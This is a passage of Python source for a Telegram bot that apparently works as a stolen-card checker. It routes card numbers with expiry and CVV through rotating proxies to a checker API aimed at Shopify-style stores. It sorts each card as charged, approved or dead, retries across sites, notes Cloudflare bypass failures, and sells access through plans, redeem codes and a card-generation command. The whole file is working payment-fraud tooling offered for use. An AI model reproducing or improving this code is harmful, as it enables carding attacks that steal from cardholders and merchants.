        if len(card.split('|')) != 4: return {'status': 'Dead', 'message': 'Invalid format', 'card': card}
        params = {'cc': card, 'site': site}
        fproxy = format_proxy_for_api(proxy)
        if fproxy: params['proxy'] = fproxy
        async with session.get(CHECKER_API_URL, params=params) as resp:
            if resp.status != 200: return {'status': 'Site Error', 'message': f'Error {resp.status}', 'card': card, 'retry': True}
            try: rj = json.loads(await resp.text())
            except: return {'status': 'Site Error', 'message': 'Format Error', 'card': card, 'retry': True}
            rm, pr, gt, st = rj.get('Response', ''), rj.get('Price', '-'), gateway_name or rj.get('Gate', 'Shopify'), rj.get('Status', '')
        if is_dead_site_error(rm): return {'status': 'Site Error', 'message': rm, 'card': card, 'retry': True, 'gateway': gt, 'price': pr}
        rl = str(rm).lower()
        if st == 'Charged' or 'order completed' in rl or '💎' in rm or 'thank you' in rl or 'payment successful' in rl: return {'status': 'Charged', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
        if 'cloudflare bypass failed' in rl: return {'status': 'Site Error', 'message': 'Cloudflare', 'card': card, 'retry': True, 'gateway': gt, 'price': pr}
        if 'insufficient_funds' in rl or 'insufficient funds' in rl: return {'status': 'Insufficient', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
        if st == 'Approved' or any(k in rl for k in ['approved', 'success', 'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc', 'incorrect_zip']): return {'status': 'Approved', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
        if any(k in rl for k in ['proxy', 'timeout', 'error', 'session', 'failed']): return {'status': 'Site Error', 'message': rm, 'card': card, 'retry': True, 'gateway': gt, 'price': pr}
        return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
    except: return {'status': 'Site Error', 'message': 'Connection dropped', 'card': card, 'retry': True}

async def check_card_with_retry(card, sites, proxies, session, gateway_name, max_retries=2):
    lr = None; ap = list(proxies) if proxies else []
    for _ in range(max_retries):
        acs = [s for s in sites if _SITE_ERRORS_COUNT.get(s, 0) < _MAX_SITE_ERRORS]
        if not acs: _SITE_ERRORS_COUNT.clear(); acs = sites
        s = random.choice(acs)
        p = random.choice(ap) if ap else None
        r = await check_card_api(card, s, p, session, gateway_name)
        if not r.get('retry'):
            if r.get('status') in ['Charged', 'Approved', 'Insufficient', 'Dead']: _SITE_ERRORS_COUNT[s] = 0
            return r
        lr = r; await asyncio.sleep(DELAY)
    if lr: return {'status': 'Dead', 'message': f'{str(lr["message"])[:40]}', 'card': card, 'gateway': gateway_name, 'price': lr.get('price', '-')}
    return {'status': 'Dead', 'message': 'Max retries', 'card': card, 'gateway': gateway_name, 'price': '-'}

async def stop_chk_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    puid = int(q.data.split(":")[1])
    if q.from_user.id != puid and q.from_user.id not in ADMIN_ID: return await q.answer("Not yours!", show_alert=True)
    proc = ACTIVE_MTXT_PROCESSES.get(puid)
    if proc:
        proc["stopped"] = True
        for t in proc.get("tasks", []):
            if not t.done(): t.cancel()
    await q.answer("🛑 Stopped Immediately!", show_alert=True)

async def empty_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE): await update.callback_query.answer()

async def check_sites_loop():
    while True:
        await get_github_sites()
        await asyncio.sleep(600)

async def post_init(app: Application):
    logger.info("🔄 Protocol: Webhook Killer initiated.")
    try: await app.bot.delete_webhook(drop_pending_updates=True)
    except: pass
    try: await init_db()
    except Exception as e: logger.error(f"❌ DB Error: {e}")
    asyncio.create_task(check_sites_loop())

def main():
    global bot_instance
    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
    bot_instance = app.bot
    app.add_error_handler(global_error_handler)
    
    # ربط جميع الأوامر بشكل مباشر لضمان الاستجابة الفورية 100%
    app.add_handler(CommandHandler(["start", "cmds", "commands"], start_cmd))
    app.add_handler(CommandHandler("info", info_cmd))
    app.add_handler(CommandHandler("plan", plan_cmd))
    app.add_handler(CommandHandler("fb", fb_cmd))
    app.add_handler(CommandHandler("addpxy", addpxy_cmd))
    app.add_handler(CommandHandler("proxy", proxy_cmd))
    app.add_handler(CommandHandler("rmpxy", rmpxy_cmd))
    app.add_handler(CommandHandler("gen", gen_cmd))
    app.add_handler(CommandHandler("redeem", redeem_cmd))
    app.add_handler(CommandHandler("validate", validate_cmd))
    app.add_handler(CommandHandler(["users", "user"], users_cmd))
    app.add_handler(CommandHandler("maint", maint_cmd))
    app.add_handler(CommandHandler("revoke", revoke_cmd))
    
    # ربط الملفات
    app.add_handler(MessageHandler(filters.Document.MimeType("text/plain"), auto_file_check_cmd))
    
    # ربط ردود الأفعال (الكول باك)
    app.add_handler(CallbackQueryHandler(gateway_selection_cb, pattern=r"^gate:"))
    app.add_handler(CallbackQueryHandler(stop_chk_cb, pattern=r"^stop_chk:"))
    app.add_handler(CallbackQueryHandler(plans_cb_handler, pattern=r"^show_plans$"))
    app.add_handler(CallbackQueryHandler(back_start_cb_handler, pattern=r"^back_start$"))
    app.add_handler(CallbackQueryHandler(check_joined_cb_handler, pattern=r"^check_joined$"))
    app.add_handler(CallbackQueryHandler(empty_callback_handler, pattern=r"^none$"))
    
    logger.info("🔄 Starting VIP System with Flawless PTB Native Command Engine...")
    
    while True:
        try:
            app.run_polling(drop_pending_updates=True)
            break
        except Conflict:
            logger.warning("⚠️ Conflict detected. Retrying...")
            time.sleep(5)
        except Exception as e:
            logger.error(f"⚠️ Fatal error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
